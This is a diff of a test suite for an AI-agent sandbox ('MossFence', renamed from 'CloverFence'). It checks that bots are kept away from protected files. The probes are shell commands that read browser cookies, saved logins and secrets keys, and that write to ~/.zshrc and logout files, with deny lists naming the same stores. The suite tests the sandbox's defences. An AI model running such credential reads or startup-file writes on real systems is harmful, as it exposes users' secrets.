+          [join(moss, "browser", "profiles", "p1", "Default", "Cookies")]: "c", [join(moss, "browser", "profiles", "p1", "Default", "Login Data")]: "c",
+          [join(moss, "secrets.enc")]: "e", [join(moss, "secrets.key")]: "k", [join(moss, "sdk", "settings.json")]: "{}",
+          [join(moss, "projects", "k", "s.provider-state.jsonl")]: "{}", [join(moss, "sdk", "projects", "k", "s.provider-state.jsonl")]: "{}",
+          [join(moss, "sdk", "projects", "k", "s.jsonl")]: "{}",
         };
         for (const [p, c] of Object.entries(files)) writeFileSync(p, c);
         // What escalates (#355's review): a browser's cookies and saved logins, the secrets by name (macOS keeps them in
         // the Keychain, the names are denied all the same), the SDK's settings, a runtime's provider state.
-        const escalations = [join(clover, "browser", "profiles", "p1", "Default", "Cookies"), join(clover, "browser", "profiles", "p1", "Default", "Login Data"),
-          join(clover, "secrets.enc"), join(clover, "secrets.key"), join(clover, "sdk", "settings.json"),
-          join(clover, "projects", "k", "s.provider-state.jsonl"), join(clover, "sdk", "projects", "k", "s.provider-state.jsonl")];
-        const fence = new CloverFence({ os: "macos", home, cloverHome: clover, temp: join(root, "tmp") });
+        const escalations = [join(moss, "browser", "profiles", "p1", "Default", "Cookies"), join(moss, "browser", "profiles", "p1", "Default", "Login Data"),
+          join(moss, "secrets.enc"), join(moss, "secrets.key"), join(moss, "sdk", "settings.json"),
+          join(moss, "projects", "k", "s.provider-state.jsonl"), join(moss, "sdk", "projects", "k", "s.provider-state.jsonl")];
+        const fence = new MossFence({ os: "macos", home, mossHome: moss, temp: join(root, "tmp") });
         const ctx = fenceContextFor(caller);
         const policy = fence.policy(ctx);
-        const profile = macFenceProfile({ policy, cloverHome: clover, home, perUserTemp: null, caller: callerPlaces(clover, "macos", ctx) });
+        const profile = macFenceProfile({ policy, mossHome: moss, home, perUserTemp: null, caller: callerPlaces(moss, "macos", ctx) });
         type Probe = { shell: string; op: "read" | "write" | "unlink"; path: string };
         const P: Probe[] = [
-          { shell: `cat '${join(clover, "settings.json")}'`, op: "read", path: join(clover, "settings.json") },
-          { shell: `echo x >> '${join(clover, "settings.json")}'`, op: "write", path: join(clover, "settings.json") },
-          { shell: `cat '${join(clover, "run", "tok")}'`, op: "read", path: join(clover, "run", "tok") },
-          { shell: `cat '${join(clover, "bots", "luna", "agents", "t.json")}'`, op: "read", path: join(clover, "bots", "luna", "agents", "t.json") },
-          { shell: `echo x >> '${join(clover, "bots", "luna", "agents", "t.json")}'`, op: "write", path: join(clover, "bots", "luna", "agents", "t.json") },
-          { shell: `echo x > '${join(clover, "bots", "luna", "agents", "new.json")}'`, op: "write", path: join(clover, "bots", "luna", "agents", "new.json") },
-          { shell: `cat '${join(clover, "bots", "luna", "memory", "MEMORY.md")}'`, op: "read", path: join(clover, "bots", "luna", "memory", "MEMORY.md") },
-          { shell: `echo x >> '${join(clover, "bots", "luna", "memory", "MEMORY.md")}'`, op: "write", path: join(clover, "bots", "luna", "memory", "MEMORY.md") },
-          { shell: `echo x > '${join(clover, "bots", "luna", "memory", "new.md")}'`, op: "write", path: join(clover, "bots", "luna", "memory", "new.md") },
-          { shell: `rm '${join(clover, "bots", "luna", "memory", "MEMORY.md")}'`, op: "unlink", path: join(clover, "bots", "luna", "memory", "MEMORY.md") },
-          { shell: `cat '${join(clover, "bots", "sol", "memory", "MEMORY.md")}'`, op: "read", path: join(clover, "bots", "sol", "memory", "MEMORY.md") },
-          { shell: `ls '${join(clover, "bots")}'`, op: "read", path: join(clover, "bots") },
-          { shell: `cat '${join(clover, "projects", "k", "s.jsonl")}'`, op: "read", path: join(clover, "projects", "k", "s.jsonl") },
-          { shell: `cat '${join(clover, "sessions-runtime", "rt.json")}'`, op: "read", path: join(clover, "sessions-runtime", "rt.json") },
+          { shell: `cat '${join(moss, "settings.json")}'`, op: "read", path: join(moss, "settings.json") },
+          { shell: `echo x >> '${join(moss, "settings.json")}'`, op: "write", path: join(moss, "settings.json") },
+          { shell: `cat '${join(moss, "run", "tok")}'`, op: "read", path: join(moss, "run", "tok") },
+          { shell: `cat '${join(moss, "bots", "luna", "agents", "t.json")}'`, op: "read", path: join(moss, "bots", "luna", "agents", "t.json") },
+          { shell: `echo x >> '${join(moss, "bots", "luna", "agents", "t.json")}'`, op: "write", path: join(moss, "bots", "luna", "agents", "t.json") },
+          { shell: `echo x > '${join(moss, "bots", "luna", "agents", "new.json")}'`, op: "write", path: join(moss, "bots", "luna", "agents", "new.json") },
+          { shell: `cat '${join(moss, "bots", "luna", "memory", "MEMORY.md")}'`, op: "read", path: join(moss, "bots", "luna", "memory", "MEMORY.md") },
+          { shell: `echo x >> '${join(moss, "bots", "luna", "memory", "MEMORY.md")}'`, op: "write", path: join(moss, "bots", "luna", "memory", "MEMORY.md") },
+          { shell: `echo x > '${join(moss, "bots", "luna", "memory", "new.md")}'`, op: "write", path: join(moss, "bots", "luna", "memory", "new.md") },
+          { shell: `rm '${join(moss, "bots", "luna", "memory", "MEMORY.md")}'`, op: "unlink", path: join(moss, "bots", "luna", "memory", "MEMORY.md") },
+          { shell: `cat '${join(moss, "bots", "sol", "memory", "MEMORY.md")}'`, op: "read", path: join(moss, "bots", "sol", "memory", "MEMORY.md") },
+          { shell: `ls '${join(moss, "bots")}'`, op: "read", path: join(moss, "bots") },
+          { shell: `cat '${join(moss, "projects", "k", "s.jsonl")}'`, op: "read", path: join(moss, "projects", "k", "s.jsonl") },
+          { shell: `cat '${join(moss, "sessions-runtime", "rt.json")}'`, op: "read", path: join(moss, "sessions-runtime", "rt.json") },
           ...escalations.map((path) => ({ shell: `cat '${path}'`, op: "read" as const, path })),
-          { shell: `cat '${join(clover, "sdk", "projects", "k", "s.jsonl")}'`, op: "read", path: join(clover, "sdk", "projects", "k", "s.jsonl") },
-          { shell: `ls '${join(clover, "browser")}'`, op: "read", path: join(clover, "browser") },
-          { shell: `echo x > '${join(clover, "plugins-state", "evil")}'`, op: "write", path: join(clover, "plugins-state", "evil") },
-          { shell: `echo x > '${join(clover, "sdk", "evil")}'`, op: "write", path: join(clover, "sdk", "evil") },
+          { shell: `cat '${join(moss, "sdk", "projects", "k", "s.jsonl")}'`, op: "read", path: join(moss, "sdk", "projects", "k", "s.jsonl") },
+          { shell: `ls '${join(moss, "browser")}'`, op: "read", path: join(moss, "browser") },
+          { shell: `echo x > '${join(moss, "plugins-state", "evil")}'`, op: "write", path: join(moss, "plugins-state", "evil") },
+          { shell: `echo x > '${join(moss, "sdk", "evil")}'`, op: "write", path: join(moss, "sdk", "evil") },
           { shell: `cat '${join(home, "project", "a.txt")}'`, op: "read", path: join(home, "project", "a.txt") },
           { shell: `echo x >> '${join(home, "project", "a.txt")}'`, op: "write", path: join(home, "project", "a.txt") },
           { shell: `echo x > '${join(home, "project", "new.txt")}'`, op: "write", path: join(home, "project", "new.txt") },
@@ -485,7 +485,7 @@ darwinDescribe("the profile agrees with policyAllows, on the real sandbox", () =
           { shell: `echo x > '${join(ownScratch, "new.md")}'`, op: "write", path: join(ownScratch, "new.md") },
           { shell: `echo x > '${join(ownRoutines, "new.md")}'`, op: "write", path: join(ownRoutines, "new.md") },
           { shell: `echo x > '${join(ownPluginData, "new.json")}'`, op: "write", path: join(ownPluginData, "new.json") },
-          { shell: `echo x > '${join(clover, "plugin-data", "luna", "new.json")}'`, op: "write", path: join(clover, "plugin-data", "luna", "new.json") },
+          { shell: `echo x > '${join(moss, "plugin-data", "luna", "new.json")}'`, op: "write", path: join(moss, "plugin-data", "luna", "new.json") },
           { shell: `echo x > '${join(home, ".zshrc")}'`, op: "write", path: join(home, ".zshrc") },
           { shell: `echo x > '${join(home, ".bash_logout")}'`, op: "write", path: join(home, ".bash_logout") },
           { shell: `echo x > '${join(home, ".zlogout")}'`, op: "write", path: join(home, ".zlogout") },
@@ -533,16 +533,16 @@ darwinDescribe("the profile agrees with policyAllows, on the real sandbox", () =
 
 describe("the Linux sandbox's mounts, as arguments", () => {
   test("a link on the way to a fenced item is held: its folder read-only, its other entries bound back, the link not (#392's review)", () => {
-    const dirs = new Set(["/h", "/h/dotfiles", "/h/dotfiles/sub", "/h/p", "/h/.clover", "/t"]);
+    const dirs = new Set(["/h", "/h/dotfiles", "/h/dotfiles/sub", "/h/p", "/h/.moss", "/t"]);
     const files = new Set(["/h/dotfiles/notes.md"]);
     const links = new Set(["/h/dotfiles/gitconfig"]);
     const fs = {
       kind: (p: string) => (dirs.has(p) ? "dir" as const : files.has(p) ? "file" as const : links.has(p) ? "other" as const : null),
       list: (d: string) => [...dirs, ...files, ...links].filter((p) => p !== d && p.startsWith(`${d}/`) && !p.slice(d.length + 1).includes("/")).map((p) => p.slice(d.length + 1)),
     };
-    const policy = { allowWrite: ["/h", "/t"], denyWrite: ["/h/dotfiles2/real", "/h/.clover"], denyRead: ["/h/.clover"], holdLinks: ["/h/dotfiles/gitconfig"],
+    const policy = { allowWrite: ["/h", "/t"], denyWrite: ["/h/dotfiles2/real", "/h/.moss"], denyRead: ["/h/.moss"], holdLinks: ["/h/dotfiles/gitconfig"],
       closedDoors: [], blockedAddresses: [], network: "none" as const };
-    const plan = bwrapPlan({ cloverHome: "/h/.clover", cwd: "/h/p", uid: 1000, fs, policy });
+    const plan = bwrapPlan({ mossHome: "/h/.moss", cwd: "/h/p", uid: 1000, fs, policy });
     const s = plan.args.join(" ");
     expect(s).toContain("--ro-bind /h/dotfiles /h/dotfiles");
     expect(s).toContain("--bind /h/dotfiles/notes.md /h/dotfiles/notes.md");
@@ -552,15 +552,15 @@ describe("the Linux sandbox's mounts, as arguments", () => {
   });
 
   test("the folders above a held link are mount points: a deep ~/a/b/c/gitconfig can't have ~/a/b renamed (#392's review)", () => {
-    const dirs = new Set(["/h", "/h/a", "/h/a/b", "/h/a/b/c", "/h/a/x", "/h/p", "/h/.clover", "/t"]);
+    const dirs = new Set(["/h", "/h/a", "/h/a/b", "/h/a/b/c", "/h/a/x", "/h/p", "/h/.moss", "/t"]);
     const links = new Set(["/h/a/b/c/gitconfig"]);
     const fs = {
       kind: (p: string) => (dirs.has(p) ? "dir" as const : links.has(p) ? "other" as const : null),
       list: (d: string) => [...dirs, ...links].filter((p) => p !== d && p.startsWith(`${d}/`) && !p.slice(d.length + 1).includes("/")).map((p) => p.slice(d.length + 1)),
     };
-    const policy = { allowWrite: ["/h", "/t"], denyWrite: ["/h/real/deep", "/h/.clover"], denyRead: ["/h/.clover"], holdLinks: ["/h/a/b/c/gitconfig"],
+    const policy = { allowWrite: ["/h", "/t"], denyWrite: ["/h/real/deep", "/h/.moss"], denyRead: ["/h/.moss"], holdLinks: ["/h/a/b/c/gitconfig"],
       closedDoors: [], blockedAddresses: [], network: "none" as const };
-    const s = bwrapPlan({ cloverHome: "/h/.clover", cwd: "/h/p", uid: 1000, fs, policy }).args.join(" ");
+    const s = bwrapPlan({ mossHome: "/h/.moss", cwd: "/h/p", uid: 1000, fs, policy }).args.join(" ");
     expect(s).toContain("--bind /h/a/b /h/a/b");
     expect(s).toContain("--bind /h/a /h/a");
     expect(s).toContain("--ro-bind /h/a/b/c /h/a/b/c");
@@ -571,27 +571,27 @@ describe("the Linux sandbox's mounts, as arguments", () => {
     expect([...order].sort((x, y) => x - y)).toEqual(order);
   });
 
-  test("the Clover home is a tmpfs view holding nothing without a caller; outside items read-only", () => {
-    const dirs = new Set(["/h", "/h/.clover", "/h/.clover/settings", "/h/.clover/run", "/h/dev", "/h/dev/luna", "/t", "/run/user/1000"]);
-    const files = new Set(["/h/.clover/settings.json", "/h/.clover/notes.txt"]);
+  test("the MOSS home is a tmpfs view holding nothing without a caller; outside items read-only", () => {
+    const dirs = new Set(["/h", "/h/.moss", "/h/.moss/settings", "/h/.moss/run", "/h/dev", "/h/dev/luna", "/t", "/run/user/1000"]);
+    const files = new Set(["/h/.moss/settings.json", "/h/.moss/notes.txt"]);
     const fs = {
       kind: (p: string) => (dirs.has(p) ? "dir" as const : files.has(p) ? "file" as const : null),
       list: (d: string) => [...dirs, ...files].filter((p) => p !== d && p.startsWith(`${d}/`) && !p.slice(d.length + 1).includes("/")).map((p) => p.slice(d.length + 1)),
     };
-    const a = bwrapArgs({ cloverHome: "/h/.clover", cwd: "/h/p", uid: 1000, fs, policy: {
-      allowWrite: ["/h", "/t"], denyWrite: ["/h/.clover", "/h/.clover/settings.json", "/h/.clover/settings", "/h/dev/luna"],
-      denyRead: ["/h/.clover", "/h/.clover/run"], closedDoors: ["systemd-run"], blockedAddresses: [], network: "none" } });
+    const a = bwrapArgs({ mossHome: "/h/.moss", cwd: "/h/p", uid: 1000, fs, policy: {
+      allowWrite: ["/h", "/t"], denyWrite: ["/h/.moss", "/h/.moss/settings.json", "/h/.moss/settings", "/h/dev/luna"],
+      denyRead: ["/h/.moss", "/h/.moss/run"], closedDoors: ["systemd-run"], blockedAddresses: [], network: "none" } });
     const s = a.join(" ");
     expect(s.startsWith("--die-with-parent --new-session --unshare-net --unshare-pid")).toBe(true);
     expect(s).toContain("--ro-bind / / --dev /dev --proc /proc --bind /h /h --bind /t /t");
     // The home is a tmpfs view: nothing of it is bound back without a caller.
-    expect(s).toContain("--tmpfs /h/.clover");
-    expect(s).toContain("--remount-ro /h/.clover");
-    expect(s).not.toContain("--ro-bind /h/.clover ");
-    expect(s).not.toContain("--bind /h/.clover/settings ");
-    expect(s).not.toContain("--bind /h/.clover/notes.txt ");
+    expect(s).toContain("--tmpfs /h/.moss");
+    expect(s).toContain("--remount-ro /h/.moss");
+    expect(s).not.toContain("--ro-bind /h/.moss ");
+    expect(s).not.toContain("--bind /h/.moss/settings ");
+    expect(s).not.toContain("--bind /h/.moss/notes.txt ");
     // The top folders exist so a runner can list its own (empty) view.
-    for (const t of ["bots", "outputs", "scratch", "routines", "plugin-data"]) expect(s).toContain(`--dir /h/.clover/${t}`);
+    for (const t of ["bots", "outputs", "scratch", "routines", "plugin-data"]) expect(s).toContain(`--dir /h/.moss/${t}`);
     // Outside the home: the development folder read-only where it is, its holder a mount point.
     expect(s).toContain("--bind /h/dev /h/dev"); // holds a development folder: a mount point, so it can't be renamed
     expect(s).toContain("--ro-bind /h/dev/luna /h/dev/luna");
@@ -600,43 +600,43 @@ describe("the Linux sandbox's mounts, as arguments", () => {
   });
 
   test("the caller's view: a bot's open access over the home's entries read-only; anyone else's own folders alone in a tmpfs view", () => {
-    const dirs = new Set(["/h", "/h/.clover", "/h/.clover/bots", "/h/.clover/bots/luna", "/h/.clover/bots/luna/memory",
-      "/h/.clover/bots/luna/agents", "/h/.clover/bots/sol", "/h/.clover/bots/sol/memory",
-      "/h/.clover/outputs", "/h/.clover/outputs/s1", "/h/.clover/outputs/c1", "/h/.clover/outputs/a1",
-      "/h/.clover/scratch", "/h/.clover/scratch/luna",
-      "/h/.clover/routines", "/h/.clover/routines/luna", "/h/.clover/sdk", "/h/.clover/sdk/projects",
-      "/h/.clover/sdk/projects/key", "/h/p"]);
-    const files = new Set(["/h/.clover/sdk/projects/key/s.jsonl", "/h/.clover/bots/luna/memory/MEMORY.md"]);
+    const dirs = new Set(["/h", "/h/.moss", "/h/.moss/bots", "/h/.moss/bots/luna", "/h/.moss/bots/luna/memory",
+      "/h/.moss/bots/luna/agents", "/h/.moss/bots/sol", "/h/.moss/bots/sol/memory",
+      "/h/.moss/outputs", "/h/.moss/outputs/s1", "/h/.moss/outputs/c1", "/h/.moss/outputs/a1",
+      "/h/.moss/scratch", "/h/.moss/scratch/luna",
+      "/h/.moss/routines", "/h/.moss/routines/luna", "/h/.moss/sdk", "/h/.moss/sdk/projects",
+      "/h/.moss/sdk/projects/key", "/h/p"]);
+    const files = new Set(["/h/.moss/sdk/projects/key/s.jsonl", "/h/.moss/bots/luna/memory/MEMORY.md"]);
     const fs = {
-      kind: (p: string) => (p === "/h/.clover/projects" ? "other" as const : dirs.has(p) ? "dir" as const : files.has(p) ? "file" as const : null),
+      kind: (p: string) => (p === "/h/.moss/projects" ? "other" as const : dirs.has(p) ? "dir" as const : files.has(p) ? "file" as const : null),
       list: (d: string) => [...dirs, ...files].filter((p) => p !== d && p.startsWith(`${d}/`) && !p.slice(d.length + 1).includes("/")).map((p) => p.slice(d.length + 1)),
     };
-    const policy = { allowWrite: ["/h"], denyWrite: ["/h/.clover", "/h/.clover/sdk/projects", "/h/.clover/projects"],
-      denyRead: ["/h/.clover", "/h/.clover/sdk/projects", "/h/.clover/projects"], closedDoors: [], blockedAddresses: [], network: "none" as const };
-    const owner = callerPlaces("/h/.clover", "linux", { sessionId: "s1", memoryOf: "luna" });
-    const s = bwrapArgs({ cloverHome: "/h/.clover", cwd: "/h/p", uid: 1000, fs, caller: owner, policy }).join(" ");
+    const policy = { allowWrite: ["/h"], denyWrite: ["/h/.moss", "/h/.moss/sdk/projects", "/h/.moss/projects"],
+      denyRead: ["/h/.moss", "/h/.moss/sdk/projects", "/h/.moss/projects"], closedDoors: [], blockedAddresses: [], network: "none" as const };
+    const owner = callerPlaces("/h/.moss", "linux", { sessionId: "s1", memoryOf: "luna" });
+    const s = bwrapArgs({ mossHome: "/h/.moss", cwd: "/h/p", uid: 1000, fs, caller: owner, policy }).join(" ");
     // A bot's own conversation (the owner's ruling of November 9 and its amendment): the home's entries read-only in a
     // tmpfs view, every bot's memory and scratch and its own outputs and routines read-write over it.
-    expect(s).toContain("--tmpfs /h/.clover ");
-    expect(s).not.toContain("--ro-bind /h/.clover /h/.clover ");
-    expect(s).toContain("--ro-bind /h/.clover/bots /h/.clover/bots");
-    expect(s).toContain("--bind /h/.clover/bots/luna/memory /h/.clover/bots/luna/memory");
-    expect(s).toContain("--bind /h/.clover/bots/sol/memory /h/.clover/bots/sol/memory");
-    expect(s).toContain("--bind /h/.clover/outputs/s1 /h/.clover/outputs/s1");
-    expect(s).not.toContain("--bind /h/.clover/outputs/c1");
-    expect(s).toContain("--bind /h/.clover/scratch/luna /h/.clover/scratch/luna");
-    expect(s).toContain("--bind /h/.clover/routines/luna /h/.clover/routines/luna");
+    expect(s).toContain("--tmpfs /h/.moss ");
+    expect(s).not.toContain("--ro-bind /h/.moss /h/.moss ");
+    expect(s).toContain("--ro-bind /h/.moss/bots /h/.moss/bots");
+    expect(s).toContain("--bind /h/.moss/bots/luna/memory /h/.moss/bots/luna/memory");
+    expect(s).toContain("--bind /h/.moss/bots/sol/memory /h/.moss/bots/sol/memory");
+    expect(s).toContain("--bind /h/.moss/outputs/s1 /h/.moss/outputs/s1");
+    expect(s).not.toContain("--bind /h/.moss/outputs/c1");
+    expect(s).toContain("--bind /h/.moss/scratch/luna /h/.moss/scratch/luna");
+    expect(s).toContain("--bind /h/.moss/routines/luna /h/.moss/routines/luna");
     // What the policy read-denies by name never enters the view: a folder that holds one is a bare directory with its
     // other entries bound one by one.
-    expect(s).toContain("--dir /h/.clover/sdk ");
-    expect(s).not.toContain("/h/.clover/sdk/projects");
-    expect(s).not.toContain("/h/.clover/projects");
-    expect(s).toContain("--remount-ro /h/.clover ");
+    expect(s).toContain("--dir /h/.moss/sdk ");
+    expect(s).not.toContain("/h/.moss/sdk/projects");
+    expect(s).not.toContain("/h/.moss/projects");
+    expect(s).toContain("--remount-ro /h/.moss ");
     // A coding session or an agent: only its own outputs, no bot folder at all.
     for (const ctx of [{ sessionId: "c1" }, { sessionId: "a1" }]) {
-      const other = bwrapArgs({ cloverHome: "/h/.clover", cwd: "/h/p", uid: 1000, fs, caller: callerPlaces("/h/.clover", "linux", ctx), policy }).join(" ");
-      expect(other).toContain("--tmpfs /h/.clover");
-      expect(other).toContain(`--bind /h/.clover/outputs/${ctx.sessionId} /h/.clover/outputs/${ctx.sessionId}`);
+      const other = bwrapArgs({ mossHome: "/h/.moss", cwd: "/h/p", uid: 1000, fs, caller: callerPlaces("/h/.moss", "linux", ctx), policy }).join(" ");
+      expect(other).toContain("--tmpfs /h/.moss");
+      expect(other).toContain(`--bind /h/.moss/outputs/${ctx.sessionId} /h/.moss/outputs/${ctx.sessionId}`);
       expect(other).not.toContain("bots/luna");
       expect(other).not.toContain("bots/sol");
     }
@@ -644,30 +644,30 @@ describe("the Linux sandbox's mounts, as arguments", () => {
 });
 
 describe("a bot's Linux view of the home (#355)", () => {
-  const H = "/h/.clover";
+  const H = "/h/.moss";
   const dirs = new Set(["/h", H, `${H}/bots`, `${H}/bots/luna`, `${H}/bots/luna/memory`, `${H}/scratch`, `${H}/scratch/luna`,
     `${H}/browser`, `${H}/browser/profiles`, `${H}/browser/profiles/p1`, `${H}/browser/profiles/p1/Default`, `${H}/sdk`,
     `${H}/sdk/projects`, `${H}/sdk/projects/k`, `${H}/projects`, `${H}/projects/k`, `${H}/credentials`, `${H}/outputs`,
     `${H}/outputs/s1`, "/h/p"]);
   const files = new Set([`${H}/browser/profiles/p1/Default/Cookies`, `${H}/browser/profiles/p1/Default/Login Data`,
-    `${H}/sdk/settings.json`, `${H}/sdk/.clover.json`, `${H}/sdk/projects/k/s1.jsonl`, `${H}/sdk/projects/k/s1.provider-state.jsonl`,
+    `${H}/sdk/settings.json`, `${H}/sdk/.moss.json`, `${H}/sdk/projects/k/s1.jsonl`, `${H}/sdk/projects/k/s1.provider-state.jsonl`,
     `${H}/projects/k/s1.jsonl`, `${H}/projects/k/s1.provider-state.jsonl`, `${H}/secrets.key`, `${H}/settings.json`]);
   const fs = {
     kind: (p: string) => (dirs.has(p) ? "dir" as const : files.has(p) ? "file" as const : null),
     list: (d: string) => [...dirs, ...files].filter((p) => p !== d && p.startsWith(`${d}/`) && !p.slice(d.length + 1).includes("/")).map((p) => p.slice(d.length + 1)),
   };
   const args = () => {
-    const fence = new CloverFence({ os: "linux", home: "/h", cloverHome: H, temp: "/tmp/t" });
+    const fence = new MossFence({ os: "linux", home: "/h", mossHome: H, temp: "/tmp/t" });
     const caller: Caller = { kind: "session", sessionId: "s1", sessionKind: "bot", bot: "luna" };
     const ctx = fenceContextFor(caller);
     const policy = fence.policy(ctx);
-    return bwrapArgs({ cloverHome: H, cwd: "/h/p", uid: 1000, fs, caller: callerPlaces(H, "linux", ctx), policy }).join(" ");
+    return bwrapArgs({ mossHome: H, cwd: "/h/p", uid: 1000, fs, caller: callerPlaces(H, "linux", ctx), policy }).join(" ");
   };
 
   test("the browser profiles, the secrets, the SDK's settings and copies never enter it, there or not at the start", () => {
     const s = args();
     expect(s).toContain(`--tmpfs ${H} `);
-    for (const gone of ["browser", "credentials", "sdk/settings.json", "sdk/.clover.json", "secrets.key", "secrets.enc", "secrets.key.cred"])
+    for (const gone of ["browser", "credentials", "sdk/settings.json", "sdk/.moss.json", "secrets.key", "secrets.enc", "secrets.key.cred"])
       expect(s).not.toContain(`${H}/${gone}`);
     // The secrets files are not on disk yet: the view is a tmpfs, so one made mid-run never appears in it.
     expect(s).not.toContain("secrets.enc");
@@ -691,21 +691,21 @@ describe("a bot's Linux view of the home (#355)", () => {
     for (let i = 0; i < 10_000; i++) many.add(`${H}/projects/k/m${i}.provider-state.jsonl`);
     const big = { kind: (p: string) => (dirs.has(p) ? "dir" as const : many.has(p) ? "file" as const : null),
       list: (d: string) => [...dirs, ...many].filter((p) => p !== d && p.startsWith(`${d}/`) && !p.slice(d.length + 1).includes("/")).map((p) => p.slice(d.length + 1)) };
-    const fence = new CloverFence({ os: "linux", home: "/h", cloverHome: H, temp: "/tmp/t" });
+    const fence = new MossFence({ os: "linux", home: "/h", mossHome: H, temp: "/tmp/t" });
     const caller: Caller = { kind: "session", sessionId: "s1", sessionKind: "bot", bot: "luna" };
     const ctx = fenceContextFor(caller);
-    const args = bwrapArgs({ cloverHome: H, cwd: "/h/p", uid: 1000, fs: big, caller: callerPlaces(H, "linux", ctx), policy: fence.policy(ctx) });
+    const args = bwrapArgs({ mossHome: H, cwd: "/h/p", uid: 1000, fs: big, caller: callerPlaces(H, "linux", ctx), policy: fence.policy(ctx) });
     const s = args.join(" ");
     expect(s).toContain(`--tmpfs ${H}/projects/k --remount-ro ${H}/projects/k`);
     expect(s).toContain(`--tmpfs ${H}/sdk/projects/k --remount-ro ${H}/sdk/projects/k`);
-    expect(s).not.toContain("/dev/null /h/.clover/projects/k/m1.");
+    expect(s).not.toContain("/dev/null /h/.moss/projects/k/m1.");
     expect(args.length).toBeLessThan(200);
   });
 });
 
 describe("the session's own repo", () => {
   test("ownRepoHooks finds the repo holding the cwd, without following links; elsewhere null", () => {
-    const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-repo-")));
+    const root = realpathSync(mkdtempSync(join(tmpdir(), "moss-repo-")));
     const home = join(root, "home");
     mkdirSync(join(home, "project", "sub"), { recursive: true });
     mkdirSync(join(home, "project", ".git", "hooks"), { recursive: true });
@@ -720,7 +720,7 @@ describe("the session's own repo", () => {
   });
 
   test("mkdirNoLinks makes plain folders and refuses links", () => {
-    const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-mkdir-")));
+    const root = realpathSync(mkdtempSync(join(tmpdir(), "moss-mkdir-")));
     try {
       const fresh = join(root, "a", "b");
       mkdirNoLinks(fresh);
@@ -737,7 +737,7 @@ describe("the session's own repo", () => {
   });
 
   test("repoConfigFiles watches the repo config, its worktree config, submodule configs, and a worktree's shared config", () => {
-    const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-repocfg-")));
+    const root = realpathSync(mkdtempSync(join(tmpdir(), "moss-repocfg-")));
     try {
       const repo = join(root, "repo");
       mkdirSync(join(repo, ".git", "modules", "sub"), { recursive: true });
@@ -763,7 +763,7 @@ describe("the session's own repo", () => {
   });
 
   test("revertPlantedGitKeys renames a temp file over and leaves no strays", () => {
-    const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-revert-")));
+    const root = realpathSync(mkdtempSync(join(tmpdir(), "moss-revert-")));
     try {
       const cfg = join(root, "config");
       writeFileSync(cfg, "[user]\n\tname = Luna\n");
@@ -780,7 +780,7 @@ describe("the session's own repo", () => {
   });
 
   test("revertPlantedGitKeys falls back to the pre-run bytes when git still sees the key (not reverted)", () => {
-    const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-revert-")));
+    const root = realpathSync(mkdtempSync(join(tmpdir(), "moss-revert-")));
     try {
       const cfg = join(root, "config");
       const prev = "[user]\n\tname = Luna\n[core]\n\teditor = vim\n";
@@ -798,7 +798,7 @@ describe("the session's own repo", () => {
   });
 
   test("revertPlantedGitKeys removes an appeared file it cannot cleanly revert", () => {
-    const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-revert-")));
+    const root = realpathSync(mkdtempSync(join(tmpdir(), "moss-revert-")));
     try {
       const cfg = join(root, "config");
       const before = new Map([[cfg, null]]);
@@ -810,7 +810,7 @@ describe("the session's own repo", () => {
   });
 
   test("writeLocked never leaves a config.lock behind, and keeps the user's mode", () => {
-    const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-lock-")));
+    const root = realpathSync(mkdtempSync(join(tmpdir(), "moss-lock-")));
     try {
       const cfg = join(root, "config");
       writeFileSync(cfg, "[user]\n\tname = Luna\n");
@@ -853,7 +853,7 @@ describe("the session's own repo", () => {
   });
 
   test("includeTargets expands globs where the platform can", () => {
-    const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-inc-")));
+    const root = realpathSync(mkdtempSync(join(tmpdir(), "moss-inc-")));
     try {
       writeFileSync(join(root, "a.inc"), "[user]\n");
       writeFileSync(join(root, "b.inc"), "[user]\n");
@@ -863,45 +863,45 @@ describe("the session's own repo", () => {
   });
 
   test("the Linux sandbox's mounts bind the session repo's hooks read-only", () => {
-    const dirs = new Set(["/h", "/h/p", "/h/p/.git", "/h/p/.git/hooks", "/h/.clover", "/h/.clover/git-template"]);
+    const dirs = new Set(["/h", "/h/p", "/h/p/.git", "/h/p/.git/hooks", "/h/.moss", "/h/.moss/git-template"]);
     const fs = {
       kind: (p: string) => (dirs.has(p) ? "dir" as const : null),
       list: (d: string) => [...dirs].filter((p) => p !== d && p.startsWith(`${d}/`) && !p.slice(d.length + 1).includes("/")).map((p) => p.slice(d.length + 1)),
     };
-    const s = bwrapArgs({ cloverHome: "/h/.clover", cwd: "/h/p", uid: 1000, fs, repoHooks: "/h/p/.git/hooks", policy: {
-      allowWrite: ["/h"], denyWrite: ["/h/.clover"], denyRead: ["/h/.clover"], closedDoors: [], blockedAddresses: [], network: "none" } }).join(" ");
+    const s = bwrapArgs({ mossHome: "/h/.moss", cwd: "/h/p", uid: 1000, fs, repoHooks: "/h/p/.git/hooks", policy: {
+      allowWrite: ["/h"], denyWrite: ["/h/.moss"], denyRead: ["/h/.moss"], closedDoors: [], blockedAddresses: [], network: "none" } }).join(" ");
     expect(s).toContain("--ro-bind /h/p/.git/hooks /h/p/.git/hooks");
-    // Clover's empty git template is bound back read-only, even without a caller.
-    expect(s).toContain("--ro-bind /h/.clover/git-template /h/.clover/git-template");
+    // MOSS's empty git template is bound back read-only, even without a caller.
+    expect(s).toContain("--ro-bind /h/.moss/git-template /h/.moss/git-template");
   });
 
   test("a missing ~/node_modules (B's #234 plugin-load deny) never holds the home: the real fence's policy, supervised as the spawner does", () => {
-    const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-fp-nm-")));
-    const home = join(root, "home"), clover = join(home, ".clover"), temp = join(root, "tmp");
-    for (const d of [clover, join(home, "project"), temp]) mkdirSync(d, { recursive: true });
-    const policy = new CloverFence({ os: "linux", home, cloverHome: clover, temp }).policy();
-    const loadDenies = policy.denyWrite.filter((d) => d.endsWith("/node_modules") && !d.startsWith(`${clover}/`));
+    const root = realpathSync(mkdtempSync(join(tmpdir(), "moss-fp-nm-")));
+    const home = join(root, "home"), moss = join(home, ".moss"), temp = join(root, "tmp");
+    for (const d of [moss, join(home, "project"), temp]) mkdirSync(d, { recursive: true });
+    const policy = new MossFence({ os: "linux", home, mossHome: moss, temp }).policy();
